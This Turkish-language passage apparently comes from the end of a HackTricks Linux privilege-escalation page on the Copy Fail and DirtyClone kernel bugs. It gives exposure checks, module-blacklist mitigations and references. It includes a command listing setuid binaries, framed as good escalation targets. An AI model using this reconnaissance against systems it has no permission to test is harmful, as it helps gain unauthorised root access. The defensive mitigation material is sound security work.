Bu varyant için yararlı etkilenme kontrolleri:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Kısa vadeli attack-surface azaltımı burada da path'e özgüdür: `48f6a5356a33` içeren bir kernel sürümüne yükseltmek clone path'i düzeltirken, `xt_TEE` autoload'unu engellemek **flag-laundering step**'ini, `esp4` / `esp6` yüklenmesini engellemek ise **decrypt sink**'ini ortadan kaldırır.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Maruziyet ve avcılık

Bu tür bir bug'dan şüpheleniyorsanız, yalnızca disk bütünlüğü kontrollerine güvenmeyin. Ayrıca şunları doğrulayın:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Aşağıdaki yapılandırma değerleri, yüklenebilir bir arayüzü çekirdeğe yerleşik olandan ayırır; crypto derleme kuralları `CONFIG_CRYPTO_USER_API_AEAD` değerini `algif_aead` ile eşler.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir modül olarak yüklenebilir/kaldırılabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: arayüz çekirdeğe yerleşik olarak derlenir
- setuid ikilileri iyi hedeflerdir; çünkü yalnızca page cache'i etkileyen bir yama, yerel bir erişimi root yetkisine yükseltmek için yeterli olabilir

#### `algif_aead` yolu için saldırı yüzeyini azaltma

Güvenlik açığı bulunan arayüz yüklenebilir bir modül tarafından sağlanıyorsa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Kernel'e derlenmişse, bazı açıklamalar init path'in şu şekilde engellendiğini bildirdi:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Bu tür bir azaltım, diğer kernel LPE’leri için de akılda tutulmaya değer: exploit belirli bir isteğe bağlı arayüze bağlıysa, bu arayüzü devre dışı bırakmak veya kara listeye almak, tam bir kernel yükseltmesi yapılmadan önce bile exploit yolunu kesebilir.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – kullanıcı tarafından yazılabilir bir PaperCut dizinindeki root tarafından çalıştırılan bir scriptin ele geçirilmesi](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) SSS](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 için Openwall oss-security açıklaması](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable düzeltmesi: crypto: algif_aead - Yerinde olmayan çalışmaya geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 danışma belgesi](https://copy.fail/)
- [7] [Theori / Xint teknik incelemesi](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone deposu / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE varyantı DirtyClone’un (CVE-2026-43503) incelenmesi ve exploit edilmesi](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux düzeltmesi: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` değerini koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux’un önceki azaltımı: splice edilmiş UDP paketleri için `SKBFL_SHARED_FRAG` ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian kılavuz sayfası](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel belgeleri](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Uygulamaları İlişkilendirmeleri](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info belirtimi](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry belirtimi](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Dili](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache güvenlik açığı](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` belgeleri](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` belgeleri](https://git-scm.com/docs/git-ls-tree)
- [33] [Git yapılandırma belgeleri](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator belgeleri](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: kalıcılık mekanizmaları](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
